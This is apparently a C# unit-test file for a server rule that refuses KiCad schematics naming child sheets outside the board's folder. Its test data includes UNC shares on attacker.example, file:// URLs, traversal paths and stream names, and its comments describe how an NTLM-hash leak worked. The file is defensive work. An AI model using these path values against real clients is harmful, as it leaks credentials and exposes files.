using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Handlers.DataHandling;
using Xunit;

namespace CRT.Data.Tests
{
    // ###########################################################################################
    // Covers KiCadSheetReferences - the server's rule that a submitted KiCad schematic names as
    // child sheets only .kicad_sch files inside the board's "KiCad data" folder (security review,
    // 2026-10-11).
    //
    // CRT's loader followed a sheet's "Sheetfile" wherever it pointed, so "//server/share/x" made
    // every Windows CRT showing the board hand that server the user's NTLM hash. CRTs installed
    // before the loader's fix still do - and read ANY file a sheet names as a schematic - so the
    // server must refuse every spelling of "somewhere else" a Windows CRT would read, and every
    // sheet that is not itself a schematic the rule checks, while passing every layout a real
    // project uses.
    // ###########################################################################################
    public sealed class KiCadSheetReferencesTests
    {
        private const string Root = "Commodore/C128/310378/KiCad data/Open128.kicad_sch";

        private const string Page = "Commodore/C128/310378/KiCad data/Pages/vic.kicad_sch";

        private static string SchematicNaming(string sheetFile) =>
            "(kicad_sch (version 20231120) (generator \"eeschema\")\n" +
            $"  (sheet (at 0 0) (size 10 10) (property \"Sheetname\" \"x\") (property \"Sheetfile\" \"{sheetFile}\"))\n" +
            ")\n";

        private static List<string> Find(string content) => KiCadSheetReferences.Find(new StringReader(content)).ToList();

        private static bool Check(string schematicPath, string content, out string reason) =>
            KiCadSheetReferences.Check(schematicPath, new StringReader(content), out reason);

        // --------------------------------------------------------------------- Find

        [Fact]
        public void Every_sheet_file_is_found_in_file_order()
        {
            string content =
                "(kicad_sch (sheet (property \"Sheetname\" \"CPU\") (property \"Sheetfile\" \"Pages/cpu.kicad_sch\"))\n" +
                "  (sheet (property \"Sheetname\" \"VIC\") (property \"Sheetfile\" \"Pages/vic.kicad_sch\")))";

            Assert.Equal(["Pages/cpu.kicad_sch", "Pages/vic.kicad_sch"], KiCadSheetReferencesTests.Find(content));
        }

        // Read the way the loader reads it: any case, quoted or not, escapes resolved.
        [Fact]
        public void A_sheet_file_is_found_in_any_case_quoted_or_bare_with_escapes_resolved()
        {
            Assert.Equal(["a.kicad_sch"], KiCadSheetReferencesTests.Find("(property SHEETFILE a.kicad_sch)"));
            Assert.Equal(["\\\\server\\share"], KiCadSheetReferencesTests.Find("(property \"Sheetfile\" \"\\\\\\\\server\\\\share\")"));
        }

        // The loader reads a list there, not a path - so there is no file to check.
        [Fact]
        public void A_sheet_file_followed_by_a_parenthesis_names_nothing()
        {
            Assert.Empty(KiCadSheetReferencesTests.Find("(property \"Sheetfile\" (at 0 0))"));
            Assert.Empty(KiCadSheetReferencesTests.Find("(property \"Sheetfile\")"));
        }

        // Generous on purpose: a "Sheetfile" anywhere is checked, not only inside a (sheet ...).
        [Fact]
        public void A_sheet_file_outside_a_sheet_node_is_still_found()
        {
            Assert.Equal(["x.kicad_sch"], KiCadSheetReferencesTests.Find("(kicad_sch (text \"Sheetfile\" \"x.kicad_sch\"))"));
        }

        // ###########################################################################################
        // *** NO TOKEN IS HELD WHOLE (code review, 2026-10-11). *** A submitted schematic may be as
        // large as a blob may be, so the rule reads no more of a token than one character past the
        // longest name it accepts - a name cut there is still known to be too long.
        // ###########################################################################################
        [Fact]
        public void A_sheet_file_longer_than_the_maximum_comes_back_cut_one_character_past_it()
        {
            string huge = new('a', KiCadSheetReferences.MaximumSheetFileLength * 50);

            string found = Assert.Single(KiCadSheetReferencesTests.Find($"(property \"Sheetfile\" \"{huge}\")"));

            Assert.Equal(KiCadSheetReferences.MaximumSheetFileLength + 1, found.Length);
        }

        // ------------------------------------------------------- StaysInKiCadFolder

        [Theory]
        [InlineData(Root, "Pages/vic.kicad_sch")]
        [InlineData(Root, "./Pages/vic.kicad_sch")]
        [InlineData(Root, "sid.kicad_sch")]
        [InlineData(Page, "cpu.kicad_sch")]
        [InlineData(Page, "../Open128.kicad_sch")]
        [InlineData(Page, "../Other pages/cia.kicad_sch")]
        [InlineData(Root, "")]
        [InlineData(Root, "   ")]
        public void A_sheet_inside_the_KiCad_folder_passes(string schematicPath, string sheetFile)
        {
            Assert.True(KiCadSheetReferences.StaysInKiCadFolder(schematicPath, sheetFile));
        }

        [Theory]
        [InlineData(Root, "//attacker.example/share/x.kicad_sch")]
        [InlineData(Root, "\\\\attacker.example\\share\\x.kicad_sch")]
        [InlineData(Root, "/etc/x.kicad_sch")]
        [InlineData(Root, "C:/Users/x.kicad_sch")]
        [InlineData(Root, "file://attacker.example/x.kicad_sch")]
        [InlineData(Root, "../x.kicad_sch")]
        [InlineData(Root, "../../../../x.kicad_sch")]
        [InlineData(Page, "../../x.kicad_sch")]
        [InlineData(Root, "Pages/../../x.kicad_sch")]
        [InlineData(Root, "Pages\\..\\..\\x.kicad_sch")]
        [InlineData(Root, ".. /x.kicad_sch")]
        [InlineData(Root, "Pages//vic.kicad_sch")]
        [InlineData(Root, "vic.kicad_sch:stream")]
        [InlineData(Root, "CON.kicad_sch")]
        public void A_sheet_anywhere_else_is_refused(string schematicPath, string sheetFile)
        {
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder(schematicPath, sheetFile));
        }

        // Not theory data: a control character in a test's name trips up the test runner.
        [Fact]
        public void A_sheet_name_with_a_control_character_is_refused()
        {
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder(Root, "vic\u0000.kicad_sch"));
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder(Root, "vic\n.kicad_sch"));
        }

        // A drive letter written with a backslash, as a Windows user would type it.
        [Fact]
        public void A_sheet_on_a_drive_named_with_a_backslash_is_refused()
        {
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder(Root, @"C:\x.kicad_sch")); // windows-path-literal: a path a contributed file may carry; refused on every OS
        }

        // A schematic outside any "KiCad data" folder may not climb out of its own folder at all.
        [Fact]
        public void A_schematic_outside_a_KiCad_folder_may_not_climb()
        {
            Assert.True(KiCadSheetReferences.StaysInKiCadFolder("Commodore/C64/250407/x.kicad_sch", "y.kicad_sch"));
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder("Commodore/C64/250407/x.kicad_sch", "../y.kicad_sch"));
        }

        // ###########################################################################################
        // A name the rule read only part of could hide anything after the cut, so its length alone
        // refuses it - even one that would resolve to a short path inside the folder ("./" x 95).
        // ###########################################################################################
        [Fact]
        public void A_sheet_name_longer_than_the_maximum_is_refused_even_inside_the_folder()
        {
            string atMaximum = string.Concat(Enumerable.Repeat("./", 94)) + "xx.kicad_sch";
            string pastMaximum = "./" + atMaximum;

            Assert.Equal(KiCadSheetReferences.MaximumSheetFileLength, atMaximum.Length);
            Assert.True(KiCadSheetReferences.StaysInKiCadFolder(Root, atMaximum));
            Assert.False(KiCadSheetReferences.StaysInKiCadFolder(Root, pastMaximum));
        }

        // --------------------------------------------------------- NamesASchematic

        [Theory]
        [InlineData("Pages/vic.kicad_sch")]
        [InlineData("VIC.KICAD_SCH")]
        [InlineData("")]
        [InlineData("   ")]
        public void A_sheet_that_is_a_schematic_passes(string sheetFile)
        {
            Assert.True(KiCadSheetReferences.NamesASchematic(sheetFile));
        }

        [Theory]
        [InlineData("board.kicad_pcb")]
        [InlineData("project.kicad_pro")]
        [InlineData("notes.txt")]
        [InlineData("vic")]
        [InlineData("Pages/vic.kicad_sch/..")]
        [InlineData("vic.kicad_sch.")]
        [InlineData("BOARD~1.KIC")]
        public void A_sheet_that_is_no_schematic_is_refused(string sheetFile)
        {
            Assert.False(KiCadSheetReferences.NamesASchematic(sheetFile));
        }

        // ------------------------------------------------------------------- Check

        [Fact]
        public void A_schematic_naming_a_network_share_is_refused_with_the_name_in_the_reason()
        {
            Assert.False(KiCadSheetReferencesTests.Check(
                Root, KiCadSheetReferencesTests.SchematicNaming("//attacker.example/share/x.kicad_sch"), out string reason));

            Assert.Contains("//attacker.example/share/x.kicad_sch", reason, StringComparison.Ordinal);
            Assert.Contains("KiCad data", reason, StringComparison.Ordinal);
        }

        [Fact]
        public void A_schematic_naming_its_pages_passes()
        {
            Assert.True(KiCadSheetReferencesTests.Check(
                Root, KiCadSheetReferencesTests.SchematicNaming("Pages/vic.kicad_sch"), out string reason));

            Assert.Empty(reason);
        }

        // One bad sheet among good ones is enough.
        [Fact]
        public void One_sheet_outside_among_sheets_inside_refuses_the_file()
        {
            string content =
                KiCadSheetReferencesTests.SchematicNaming("Pages/vic.kicad_sch") +
                KiCadSheetReferencesTests.SchematicNaming("../../x.kicad_sch");

            Assert.False(KiCadSheetReferencesTests.Check(Root, content, out _));
        }

        // ###########################################################################################
        // *** A SHEET NAMING A FILE THAT IS NO SCHEMATIC IS REFUSED (code review, 2026-10-11). ***
        // An installed CRT reads whatever a sheet names as a schematic and follows the sheets inside
        // it - but the rule looks inside .kicad_sch files only. So a sheet naming the board's own
        // .kicad_pcb, which carries a "(kicad_sch ...)" form whose sheet names a share, passed the
        // check on both files, and still sent every Windows user's NTLM hash to that share.
        // ###########################################################################################
        [Fact]
        public void A_schematic_naming_a_sheet_that_is_no_schematic_is_refused_with_the_name_in_the_reason()
        {
            const string Pcb = "Commodore/C64/250407/KiCad data/board.kicad_pcb";

            string pcbCarryingASheet =
                "(kicad_pcb (version 20240108))\n" + KiCadSheetReferencesTests.SchematicNaming("//attacker.example/share/x.kicad_sch");

            // The .kicad_pcb itself is not looked inside...
            Assert.True(KiCadSheetReferencesTests.Check(Pcb, pcbCarryingASheet, out _));

            // ...so the schematic pointing a sheet at it is what is refused.
            Assert.False(KiCadSheetReferencesTests.Check(
                "Commodore/C64/250407/KiCad data/main.kicad_sch", KiCadSheetReferencesTests.SchematicNaming("board.kicad_pcb"), out string reason));

            Assert.Contains("[board.kicad_pcb]", reason, StringComparison.Ordinal);
            Assert.Contains(".kicad_sch", reason, StringComparison.Ordinal);
        }

        // ###########################################################################################
        // *** THE REASON QUOTES AT MOST 80 CHARACTERS OF THE NAME (code review, 2026-10-11). *** It
        // becomes a finding's message, and a whole name of 70,000 characters made the finding too
        // big for its column: finalise failed with a 500 instead of the refusal.
        // ###########################################################################################
        [Fact]
        public void A_refusal_quotes_a_long_sheet_name_cut_short()
        {
            string longShare = "//attacker.example/" + new string('x', 150) + ".kicad_sch";
            string huge = "//attacker.example/" + new string('x', 70_000) + ".kicad_sch";

            Assert.False(KiCadSheetReferencesTests.Check(Root, KiCadSheetReferencesTests.SchematicNaming(longShare), out string reason));
            Assert.Contains($"[{longShare[..80]}...]", reason, StringComparison.Ordinal);

            Assert.False(KiCadSheetReferencesTests.Check(Root, KiCadSheetReferencesTests.SchematicNaming(huge), out reason));
            Assert.Contains($"longer than {KiCadSheetReferences.MaximumSheetFileLength} characters", reason, StringComparison.Ordinal);
            Assert.True(reason.Length < 400, $"The reason is {reason.Length} characters long.");
        }

        // Only a schematic names sheets; nothing else is looked inside - or read at all.
        [Fact]
        public void A_file_that_is_no_schematic_always_passes_and_is_not_read()
        {
            var unread = new StringReader(KiCadSheetReferencesTests.SchematicNaming("//attacker.example/share/x.kicad_sch"));

            Assert.True(KiCadSheetReferences.Check("Commodore/C64/250407/KiCad data/board.kicad_pcb", unread, out _));
            Assert.True(KiCadSheetReferences.Check("Commodore/C64/250407/notes.txt", unread, out _));
            Assert.Equal('(', (char)unread.Peek());
        }

        [Fact]
        public void The_rule_applies_to_schematics_in_any_case_and_to_nothing_else()
        {
            Assert.True(KiCadSheetReferences.AppliesTo("a/b.kicad_sch"));
            Assert.True(KiCadSheetReferences.AppliesTo("a/b.KICAD_SCH"));
            Assert.False(KiCadSheetReferences.AppliesTo("a/b.kicad_pcb"));
            Assert.False(KiCadSheetReferences.AppliesTo(null));
        }
    }
}
